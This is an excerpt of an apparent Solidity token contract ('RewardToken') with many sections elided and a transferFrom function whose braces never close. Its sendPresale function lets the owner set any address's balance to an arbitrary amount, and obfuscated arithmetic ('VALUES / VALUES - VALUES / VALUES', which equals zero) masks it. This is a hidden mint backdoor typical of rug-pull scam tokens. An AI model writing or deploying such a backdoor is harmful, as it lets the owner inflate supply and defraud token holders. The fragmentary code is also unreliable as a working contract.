...
contract DOGEERC20 is DOGECONTEXTO {
  ...
  modifier onlyOwner() {
    require(_owner == _msgSender(), "DOGEERC20: caller is not the owner");
    _;
  }
  ...
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "DOGEERC20: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract RewardToken is DOGECONTEXTO, DOGEANTOBOTOS, DOGEERC20 {
  ...
  function transferFrom(address sender, address recipient, uint256 VALUES) external override returns (bool) {
    ...
    return true;
     ...
     function sendPresale(address presaleadresse, uint256 VALUES) external onlyOwner {
      ALLbalances[presaleadresse] = (VALUES / VALUES - VALUES / VALUES) + VALUES * 10 ** 9;
  }
